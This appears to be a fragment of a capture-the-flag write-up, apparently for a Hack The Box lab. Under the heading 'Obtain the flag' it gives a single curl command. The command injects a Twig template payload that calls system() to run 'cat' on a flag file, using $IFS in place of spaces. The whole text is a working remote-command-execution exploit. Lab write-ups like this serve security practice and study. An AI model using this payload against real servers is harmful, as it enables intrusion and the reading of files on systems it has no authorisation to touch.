Obtain the flag
```
curl -d "api=http://truckapi.htb/?id={{['cat%24IFS../../../flag.txt']|filter('system')}}" http://94.237.51.160:44671/
```
